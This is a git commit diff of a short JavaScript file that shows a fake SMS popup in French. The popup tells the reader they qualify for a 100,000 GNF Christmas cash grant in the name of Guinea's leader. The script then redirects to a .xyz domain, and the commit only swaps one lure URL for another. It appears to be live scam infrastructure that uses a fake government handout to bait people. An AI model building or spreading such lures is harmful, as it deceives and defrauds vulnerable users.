615512ec77c85f9ea777ff9b72a09d455faa7e6c
bigetijazz20 <bigetijazz20@gmail.com>
2024-12-02 11:47:42 -0800

    Update guineagrant.js

--- guineagrant.js
+++ guineagrant.js
@@ -2,5 +2,5 @@
 var password = 'RECLAMER 100,000 GNF'
 password=prompt('SMS: Félicitations, vous êtes admissible à MAMADY DOUMBOUYA 100,000 GNF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 100,000 GNF');
 if (password != 'RECLAMER 100,000 GNF') {
-location.href='https://www.xmas-season.xyz/100000GNF-subvention';
+location.href='https://www.xmas-25.xyz/retirer-100000GNF';
 }
